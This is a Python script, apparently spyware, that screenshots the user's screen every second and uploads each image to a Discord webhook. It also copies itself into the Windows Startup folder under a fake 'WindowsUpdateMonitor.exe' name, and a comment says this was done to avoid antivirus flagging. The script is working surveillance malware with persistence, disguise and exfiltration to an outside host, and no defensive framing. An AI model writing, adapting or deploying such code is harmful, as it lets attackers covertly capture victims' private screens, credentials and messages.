import os
import shutil
import sys
import time
import requests
import io
import threading
import pyautogui as pag
import keyboard

# Configurations
pag.FAILSAFE = True
WEBHOOK_URL = "https://discord.com/api/webhooks/example"  #put you discord webhook after webhook_url = 
# Changed filename from svchost.exe to avoid immediate AV flagging
PERSISTENCE_NAME = "WindowsUpdateMonitor.exe" 

stop_flag = False

def stop_handler():
    global stop_flag
    stop_flag = True
    print("\n[!] Stop signal received.")

def mouse_failsafe():
    global stop_flag
    while not stop_flag:
        # If mouse is moved to top-left corner (0,0), stop the script
        if pag.position() == (0, 0):
            stop_flag = True
            print("[!] Mouse failsafe triggered.")
        time.sleep(0.5)

def setup_controls():
    try:
        keyboard.add_hotkey('ctrl+shift+q', stop_handler)
        keyboard.add_hotkey('f12', stop_handler)
        keyboard.add_hotkey('esc', stop_handler)
        threading.Thread(target=mouse_failsafe, daemon=True).start()
        print("✓ Controls and failsafes initialized.")
    except Exception as e:
        print(f"[-] Keyboard hook failed (requires Admin): {e}")

def ensure_startup():
    """Establishes persistence in the Windows Startup folder."""
    try:
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        target_path = os.path.join(startup_folder, PERSISTENCE_NAME)
        
        # Get the path of the current running file (works for script or EXE)
        if getattr(sys, 'frozen', False):
            current_path = sys.executable
        else:
            current_path = os.path.abspath(__file__)

        if not os.path.exists(target_path):
            shutil.copy2(current_path, target_path)
            print(f"✓ Persistence established: {target_path}")
        else:
            print("✓ Persistence already active.")
    except Exception as e:
        print(f"[-] Persistence failed: {e}")

def main():
    global stop_flag
    count = 0
    print("✓ Stealth monitor active (1s intervals)")

    while not stop_flag:
        try:
            # Capture screenshot
            img = pag.screenshot()
            
            # Save to memory buffer
            buf = io.BytesIO()
            img.save(buf, 'PNG')
            buf.seek(0)
            
            # Prepare payload
            files = {'file': (f'shot_{count}.png', buf, 'image/png')}
            data = {
                'username': 'ScreenMonitor', 
                'content': f'Capture #{count} | Timestamp: {time.strftime("%H:%M:%S")}'
            }
            
            # Send to Discord
            r = requests.post(WEBHOOK_URL, data=data, files=files, timeout=10)
            
            if r.status_code == 204:
                print(f"✓ Sent frame {count}")
            else:
                print(f"✗ Failed to send {count}: {r.status_code}")
            
            count += 1
        except Exception as e:
            print(f"[-] Loop error: {e}")
        
        time.sleep(1)

if __name__ == "__main__":
    try:
        ensure_startup()
        setup_controls()
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Critical Failure: {e}")
    
    print("Terminated.")
    # Keeps the window open so you can read any error messages if it crashes

    input("Press Enter to exit...")
